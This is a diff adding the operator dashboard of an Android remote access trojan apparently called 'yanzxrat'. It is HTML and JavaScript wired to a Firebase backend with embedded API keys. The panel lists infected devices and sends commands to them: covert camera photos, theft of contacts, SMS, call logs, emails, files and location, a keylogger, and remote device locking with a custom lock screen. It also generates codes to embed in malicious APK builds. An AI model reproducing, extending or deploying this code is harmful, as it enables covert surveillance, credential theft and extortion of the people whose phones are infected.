+    <div class="modal-content"><h3>🔓 Unlock Device</h3><input type="password" id="unlockPassword" placeholder="Password"><button onclick="confirmUnlock()">Unlock</button><button style="background:#333; margin-top:10px;" onclick="closeModal()">Batal</button></div>
+</div>
+
+<!-- MODAL BUAT KODE BARU (TANPA PERANGKAT) -->
+<div class="kode-modal" id="buatKodeBaruModal">
+    <div class="kode-modal-content">
+        <div class="kode-icon">✨</div>
+        <div class="kode-title">Buat Kode Baru</div>
+        <div class="kode-subtitle">Generate kode untuk APK baru</div>
+        <div class="kode-display">
+            <div class="kode-digits" id="baruKodeDigits">000000000000</div>
+        </div>
+        <div class="kode-buttons">
+            <button class="kode-btn kode-btn-copy" onclick="copyBaruKode()">📋 COPY</button>
+            <button class="kode-btn kode-btn-generate" onclick="generateBaruKode()">🎲 Generate Baru</button>
+            <button class="kode-btn kode-btn-close" onclick="closeBuatKodeBaruModal()">✕ Tutup</button>
+        </div>
+        <div class="kode-warning">
+            ⚠️ Tempelkan kode ini ke file kode.txt<br>di folder assets APK sebelum build
+        </div>
+    </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyBqIqdlzzXoZoT8N_J9HRmpoJvbH05Da4c",
+        authDomain: "inject-60ad5.firebaseapp.com",
+        databaseURL: "https://inject-60ad5-default-rtdb.firebaseio.com",
+        projectId: "inject-60ad5",
+        storageBucket: "inject-60ad5.firebasestorage.app",
+        messagingSenderId: "1043671474298",
+        appId: "1:1043671474298:android:2276352c0d88ebd9709bc3"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    let devices = [], refreshInterval = null, selectedDevice = null, selectedDeviceKode = null;
+    let currentBaruKode = '';
+
+    // ========== BUAT KODE BARU (TANPA PERANGKAT) ==========
+    function openBuatKodeBaru() {
+        generateBaruKode();
+        document.getElementById('buatKodeBaruModal').classList.add('show');
+    }
+
+    function closeBuatKodeBaruModal() {
+        document.getElementById('buatKodeBaruModal').classList.remove('show');
+    }
+
+    function generateBaruKode() {
+        let kode = '';
+        for (let i = 0; i < 12; i++) {
+            kode += Math.floor(Math.random() * 10).toString();
+        }
+        currentBaruKode = kode;
+        document.getElementById('baruKodeDigits').innerHTML = kode;
+    }
+
+    function copyBaruKode() {
+        navigator.clipboard.writeText(currentBaruKode);
+        alert('✅ Kode ' + currentBaruKode + ' telah disalin!\n\nTempelkan ke file kode.txt di folder assets APK');
+    }
+
+    // ========== LOAD DEVICES ==========
+    async function loadDevices() {
+        try {
+            const snapshot = await database.ref('User').once('value');
+            const users = snapshot.val();
+            devices = [];
+            if (users) {
+                for (let id in users) {
+                    const user = users[id];
+                    let deviceKode = user.registered_kode || user.device_kode || null;
+                    if (deviceKode || user.Device) {
+                        const isOnline = user.lock_status === 'locked' || (user.last_seen && (Date.now() - user.last_seen < 60000));
+                        devices.push({ id, name: user.Device || id.substring(0,15), kode: deviceKode || 'BELUM ADA KODE', status: isOnline ? 'online' : 'offline', os: user.Android_Ver || 'Android', battery: user.battery || Math.floor(Math.random() * 100) });
+                    }
+                }
+            }
+            document.getElementById('totalDevices').innerText = devices.length;
+            document.getElementById('onlineDevices').innerText = devices.filter(d => d.status === 'online').length;
+            document.getElementById('offlineDevices').innerText = devices.filter(d => d.status === 'offline').length;
+            renderDeviceList();
+        } catch(e) { console.error(e); }
+    }
+    
+    // ========== LOGOUT ==========
+function logout() {
+    // Hapus semua data session
+    localStorage.removeItem('adminId');
+    localStorage.removeItem('adminEmail');
+    localStorage.removeItem('adminKode');
+    localStorage.removeItem('hwid');
+    
+    // Redirect ke halaman login
+    window.location.href = 'https://yanzxrat1576.netlify.app/loginn.html';
+}
+
+    function renderDeviceList() {
+        const html = devices.map(device => `<div class="device-card ${device.status}" onclick="selectDevice('${device.id}', '${device.kode}', '${device.name.replace(/'/g, "\\'")}')"><div class="device-header"><div class="device-name">${device.name}</div><div class="device-status ${device.status}">${device.status === 'online' ? 'ONLINE' : 'OFFLINE'}</div></div><div class="device-info">${device.os}</div><div class="device-info">Kode: ${device.kode}</div><div class="device-percent">🔋 ${device.battery}%</div></div>`).join('');
+        document.getElementById('deviceList').innerHTML = html || '<div class="loading">Tidak ada perangkat</div>';
+        document.getElementById('devicesPageList').innerHTML = html || '<div class="loading">Tidak ada perangkat</div>';
+    }
+
+    function selectDevice(id, kode, name) {
+        selectedDevice = id; selectedDeviceKode = kode;
+        document.getElementById('selectedDeviceName').innerHTML = name.substring(0,20) + '...';
+        document.getElementById('controlPanel').classList.remove('hide');
+    }
+    function closeControlPanel() { document.getElementById('controlPanel').classList.add('hide'); selectedDevice = null; selectedDeviceKode = null; }
+
+    async function sendCommand(cmd, extra = {}) {
+        if (!selectedDevice || !selectedDeviceKode) { alert('Pilih perangkat dulu sayang!'); return false; }
+        if (selectedDeviceKode && selectedDeviceKode.length === 12) {
+            try { await database.ref(`User/${selectedDevice}`).update({ cmd, input_kode: selectedDeviceKode, ...extra }); return true; } 
+            catch(e) { alert('Error: ' + e.message); return false; }
+        } else { alert('❌ Kode tidak valid!'); return false; }
+    }
+    function sendCommandWithPrompt(cmd, msg) { let v = prompt(msg); if(v) sendCommand(cmd, cmd==='set_wall'||cmd==='open_url'?{url:v}:cmd==='toast'?{msg:v}:{}); }
+    function downloadFilePrompt() { let path = prompt('Path file target:'); if(path) sendCommand('download_file', { path: path }); }
+
+    // FLOATING PANEL FUNCTIONS
+    function openCameraPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('cameraPanel').classList.remove('hide'); }
+    function closeCameraPanel() { document.getElementById('cameraPanel').classList.add('hide'); }
+    async function takePhoto(type) { let cmd = type==='front'?'snap_front':'snap_back'; document.getElementById('cameraPreview').innerHTML='<div class="loading-text">⏳ Mengambil foto...</div>'; await sendCommand(cmd); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_Photo`).once('value'); let img=snap.val(); if(img) document.getElementById('cameraPreview').innerHTML=`<img src="data:image/jpeg;base64,${img}" style="max-width:100%; max-height:300px; border-radius:16px;">`; else document.getElementById('cameraPreview').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    function openContactsPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('contactsPanel').classList.remove('hide'); refreshContacts(); }
+    function closeContactsPanel() { document.getElementById('contactsPanel').classList.add('hide'); }
+    async function refreshContacts() { document.getElementById('contactsContent').innerHTML='<div class="loading-text">⏳ Mengambil kontak...</div>'; await sendCommand('get_contacts'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_Contacts`).once('value'); let data=snap.val(); if(data) document.getElementById('contactsContent').innerHTML=`<div class="list-item"><div class="list-detail">${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('contactsContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    function openSmsPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('smsPanel').classList.remove('hide'); refreshSms(); }
+    function closeSmsPanel() { document.getElementById('smsPanel').classList.add('hide'); }
+    async function refreshSms() { document.getElementById('smsContent').innerHTML='<div class="loading-text">⏳ Mengambil SMS...</div>'; await sendCommand('get_sms'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_SMS`).once('value'); let data=snap.val(); if(data) document.getElementById('smsContent').innerHTML=`<div class="list-item"><div class="list-detail">${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('smsContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    function openCallLogsPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('callLogsPanel').classList.remove('hide'); refreshCallLogs(); }
+    function closeCallLogsPanel() { document.getElementById('callLogsPanel').classList.add('hide'); }
+    async function refreshCallLogs() { document.getElementById('callLogsContent').innerHTML='<div class="loading-text">⏳ Mengambil panggilan...</div>'; await sendCommand('call_logs'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_CallLogs`).once('value'); let data=snap.val(); if(data) document.getElementById('callLogsContent').innerHTML=`<div class="list-item"><div class="list-detail">${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('callLogsContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    function openFilePanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('filePanel').classList.remove('hide'); document.getElementById('filePathInput').value='/sdcard/'; browseFile(); }
+    function closeFilePanel() { document.getElementById('filePanel').classList.add('hide'); }
+    async function browseFile() { let path=document.getElementById('filePathInput').value; if(!path) path='/sdcard/'; document.getElementById('fileContent').innerHTML='<div class="loading-text">⏳ Mengambil daftar file...</div>'; await sendCommand('get_files',{path:path}); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_Files`).once('value'); let data=snap.val(); if(data) document.getElementById('fileContent').innerHTML=`<div class="list-item"><div class="list-detail">${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('fileContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    function openAppsPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('appsPanel').classList.remove('hide'); refreshApps(); }
+    function closeAppsPanel() { document.getElementById('appsPanel').classList.add('hide'); }
+    async function refreshApps() { document.getElementById('appsContent').innerHTML='<div class="loading-text">⏳ Mengambil aplikasi...</div>'; await sendCommand('installed_apps'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_Apps`).once('value'); let data=snap.val(); if(data) document.getElementById('appsContent').innerHTML=`<div class="list-item"><div class="list-detail">${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('appsContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    function openLocationPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('locationPanel').classList.remove('hide'); refreshLocation(); }
+    function closeLocationPanel() { document.getElementById('locationPanel').classList.add('hide'); }
+    async function refreshLocation() { document.getElementById('locationAddress').innerHTML='⏳ Mengambil lokasi...'; await sendCommand('get_loc'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_Loc`).once('value'); let result=snap.val(); if(result){ document.getElementById('locationAddress').innerHTML=result.replace(/\n/g,'<br>'); let match=result.match(/Koordinat: ([-?\d.]+), ([-?\d.]+)/); if(match){ let lat=match[1], lng=match[2]; document.getElementById('mapFrame').src=`https://www.google.com/maps/embed/v1/place?key=AIzaSyBqIqdlzzXoZoT8N_J9HRmpoJvbH05Da4c&q=${lat},${lng}&zoom=12`; document.getElementById('locationCoord').innerHTML=`📍 Koordinat: ${lat}, ${lng}`; } } else document.getElementById('locationAddress').innerHTML='❌ Gagal'; },4000); }
+    function openEmailPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('emailPanel').classList.remove('hide'); refreshEmails(); }
+    function closeEmailPanel() { document.getElementById('emailPanel').classList.add('hide'); }
+    async function refreshEmails() { document.getElementById('emailContent').innerHTML='<div class="loading-text">⏳ Mengambil email...</div>'; await sendCommand('get_emails'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_Emails`).once('value'); let data=snap.val(); if(data) document.getElementById('emailContent').innerHTML=`<div class="list-item"><div class="list-detail">${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('emailContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    async function getEmailApps() { document.getElementById('emailContent').innerHTML='<div class="loading-text">⏳ Mendeteksi aplikasi email...</div>'; await sendCommand('get_email_apps'); setTimeout(async()=>{let snap=await database.ref(`User/${selectedDevice}/Result_EmailApps`).once('value'); let data=snap.val(); if(data) document.getElementById('emailContent').innerHTML=`<div class="list-item"><div class="list-detail">📱 ${data.replace(/\n/g,'<br>')}</div></div>`; else document.getElementById('emailContent').innerHTML='<div class="loading-text">❌ Gagal</div>';},4000); }
+    // ========== WALLPAPER PANEL ==========
+function openWallpaperPanel() {
+    if (!selectedDevice) { alert('Pilih perangkat dulu sayang!'); return; }
+    document.getElementById('wallpaperPanel').classList.remove('hide');
+}
+function closeWallpaperPanel() { document.getElementById('wallpaperPanel').classList.add('hide'); }
+function submitWallpaper() {
+    const url = document.getElementById('wallpaperUrl').value;
+    if (url) sendCommand('set_wall', { url: url });
+    closeWallpaperPanel();
+    document.getElementById('wallpaperUrl').value = '';
+}
+
+// ========== OPEN APP PANEL ==========
+function openOpenappPanel() {
+    if (!selectedDevice) { alert('Pilih perangkat dulu sayang!'); return; }
+    document.getElementById('openappPanel').classList.remove('hide');
+}
+function closeOpenappPanel() { document.getElementById('openappPanel').classList.add('hide'); }
+function submitOpenApp() {
+    const pkg = document.getElementById('openappPackage').value;
+    if (pkg) sendCommand('open_app', { package: pkg });
+    closeOpenappPanel();
+    document.getElementById('openappPackage').value = '';
+}
+
+// ========== TOAST PANEL ==========
+function openToastPanel() {
+    if (!selectedDevice) { alert('Pilih perangkat dulu sayang!'); return; }
+    document.getElementById('toastPanel').classList.remove('hide');
+}
+function closeToastPanel() { document.getElementById('toastPanel').classList.add('hide'); }
+function submitToast() {
+    const msg = document.getElementById('toastMessage').value;
+    if (msg) sendCommand('toast', { msg: msg });
+    closeToastPanel();
+    document.getElementById('toastMessage').value = '';
+}
+
+// ========== PLAY SOUND PANEL ==========
+function openPlaysoundPanel() {
+    if (!selectedDevice) { alert('Pilih perangkat dulu sayang!'); return; }
+    document.getElementById('playsoundPanel').classList.remove('hide');
+}
+function closePlaysoundPanel() { document.getElementById('playsoundPanel').classList.add('hide'); }
+function submitPlaySound() {
+    const url = document.getElementById('soundUrl').value;
+    if (url) sendCommand('play_sound', { url: url });
+    closePlaysoundPanel();
+    document.getElementById('soundUrl').value = '';
+}
+
+// ========== BUKA URL PANEL ==========
+function openOpenurlPanel() {
+    if (!selectedDevice) { alert('Pilih perangkat dulu sayang!'); return; }
+    document.getElementById('openurlPanel').classList.remove('hide');
+}
+function closeOpenurlPanel() { document.getElementById('openurlPanel').classList.add('hide'); }
+function submitOpenUrl() {
+    const url = document.getElementById('openurlLink').value;
+    if (url) sendCommand('open_url', { url: url });
+    closeOpenurlPanel();
+    document.getElementById('openurlLink').value = '';
+}
+
+    // KEYLOGGER
+    let keylogRefreshInterval = null, lastKeylogData = "", keylogEntryCount = 0;
+    function openKeyloggerPanel() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('keyloggerPanel').classList.remove('hide'); refreshKeylog(); if(keylogRefreshInterval) clearInterval(keylogRefreshInterval); keylogRefreshInterval = setInterval(refreshKeylog, 3000); }
+    function closeKeyloggerPanel() { document.getElementById('keyloggerPanel').classList.add('hide'); if(keylogRefreshInterval) { clearInterval(keylogRefreshInterval); keylogRefreshInterval = null; } }
+    async function startKeylogger() { if(!selectedDevice) return; await sendCommand('start_keylogger'); document.getElementById('keylogStatus').innerHTML = '▶️ ACTIVE'; document.getElementById('keylogStatus').style.color = '#10a37f'; setTimeout(refreshKeylog, 2000); }
+    async function stopKeylogger() { if(!selectedDevice) return; await sendCommand('stop_keylogger'); document.getElementById('keylogStatus').innerHTML = '⏹️ STOPPED'; document.getElementById('keylogStatus').style.color = '#dc2626'; }
+    async function refreshKeylog() { if(!selectedDevice) return; try { const snapshot = await database.ref(`User/${selectedDevice}/Result_Keylogger`).once('value'); let keylogData = snapshot.val(); const timeSnapshot = await database.ref(`User/${selectedDevice}/keylog_timestamp`).once('value'); const lastTime = timeSnapshot.val(); if(keylogData && keylogData !== lastKeylogData) { lastKeylogData = keylogData; keylogEntryCount++; let displayHtml = ''; const lines = keylogData.split(/(?=\[|\n)/); for(let line of lines) { if(line.trim().length > 0) { displayHtml += `<div class="list-item" style="border-left-color: #10a37f;"><div class="list-detail" style="font-family: monospace;">${escapeHtml(line)}</div>${lastTime ? `<div class="keylog-timestamp">🕐 ${new Date(lastTime).toLocaleTimeString()}</div>` : ''}</div>`; } } document.getElementById('keylogContent').innerHTML = displayHtml || '<div class="loading-text">Belum ada data keylogger</div>'; document.getElementById('keylogCharCount').innerText = keylogData.length || 0; document.getElementById('keylogEntryCount').innerText = keylogEntryCount; const contentDiv = document.getElementById('keylogContent'); if(contentDiv) contentDiv.scrollTop = contentDiv.scrollHeight; } } catch(e) { console.error(e); } }
+    function clearKeylogDisplay() { document.getElementById('keylogContent').innerHTML = '<div class="loading-text">Display cleared</div>'; document.getElementById('keylogCharCount').innerText = '0'; }
+    function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
+
+    // LOCK SETTINGS
+    function openLockSettings() { if(!selectedDevice){alert('Pilih device dulu!');return;} document.getElementById('lockSettingsPanel').classList.remove('hide'); loadCurrentLockSettings(); }
+    function openLockSettingsFromNav() { if(!selectedDevice){alert('Pilih device dulu dari dashboard!');switchPage('dashboard');return;} openLockSettings(); }
+    function closeLockSettings() { document.getElementById('lockSettingsPanel').classList.add('hide'); }
+    async function loadCurrentLockSettings() { let snap=await database.ref(`User/${selectedDevice}/lock_settings`).once('value'); let s=snap.val(); if(s){ if(s.title) document.getElementById('lockTitle').value=s.title; if(s.subtitle) document.getElementById('lockSubtitle').value=s.subtitle; if(s.custom_message) document.getElementById('lockCustomMessage').value=s.custom_message; if(s.button_text) document.getElementById('lockButtonText').value=s.button_text; if(s.warning) document.getElementById('lockWarning').value=s.warning; if(s.bg_color) document.getElementById('lockBgColor').value=s.bg_color; if(s.accent_color) document.getElementById('lockAccentColor').value=s.accent_color; if(s.icon) document.getElementById('lockIcon').value=s.icon; } }
+    async function setLockPassword() { let p=document.getElementById('lockPassword').value; if(!p||p.length<4){alert('Password minimal 4 digit!');return;} await sendCommand('set_lock_pass',{new_pass:p}); document.getElementById('lockPassword').value=''; alert('✅ Password berhasil diubah!'); }
+    async function applyLockSettings() { let settings={ title:document.getElementById('lockTitle').value||"🔒 DEVICE LOCKED", subtitle:document.getElementById('lockSubtitle').value||"This device has been locked remotely", custom_message:document.getElementById('lockCustomMessage').value||"Contact administrator to unlock", button_text:document.getElementById('lockButtonText').value||"🔓 UNLOCK", warning:document.getElementById('lockWarning').value||"⚠️ DO NOT FORCE CLOSE", bg_color:document.getElementById('lockBgColor').value, accent_color:document.getElementById('lockAccentColor').value, icon:document.getElementById('lockIcon').value||"🔒" }; await sendCommand('set_lock_settings',settings); alert('✅ Settings applied!'); }
+    async function sendLockNow() { await sendCommand('lock'); closeLockSettings(); alert('🔒 Device locked!'); }
+
+    // UNLOCK
+    function openUnlockDialog() { document.getElementById('unlockModal').classList.add('show'); }
+    function confirmUnlock() { let pass=document.getElementById('unlockPassword').value; if(pass) sendCommand('unlock',{pass:pass}); closeModal(); }
+    function closeModal() { document.getElementById('unlockModal').classList.remove('show'); document.getElementById('unlockPassword').value=''; }
+
+    // UI
+    function hubungiDeveloper() { alert('Hubungi Developer:\n📧 yanzxrat@official.com\n📱 Telegram: @yanzxrat'); }
+    function refreshData() { loadDevices(); alert('Data refreshed!'); }
+    function toggleDrawer() { document.getElementById('drawer').classList.toggle('open'); document.getElementById('overlay').classList.toggle('show'); }
+    function closeDrawer() { document.getElementById('drawer').classList.remove('open'); document.getElementById('overlay').classList.remove('show'); }
+    function navigateTo(page) { closeDrawer(); switchPage(page); }
+    function switchPage(page) {
+        document.getElementById('dashboardPage').classList.remove('active');
+        document.getElementById('devicesPage').classList.remove('active');
+        document.getElementById('accountPage').classList.remove('active');
+        document.getElementById(`${page}Page`).classList.add('active');
+        document.querySelectorAll('.nav-item').forEach((item,i)=>{ item.classList.remove('active'); if((page==='dashboard'&&i===0)||(page==='devices'&&i===1)||(page==='account'&&i===3)) item.classList.add('active'); });
+        closeControlPanel(); closeCameraPanel(); closeContactsPanel(); closeSmsPanel(); closeCallLogsPanel(); closeFilePanel(); closeAppsPanel(); closeLocationPanel(); closeEmailPanel(); closeKeyloggerPanel(); closeLockSettings();
+    }
+    function startAutoRefresh() { if(refreshInterval) clearInterval(refreshInterval); refreshInterval = setInterval(loadDevices, 10000); }
+    
+    loadDevices();
+    startAutoRefresh();
+</script>
+</body>
+</html>
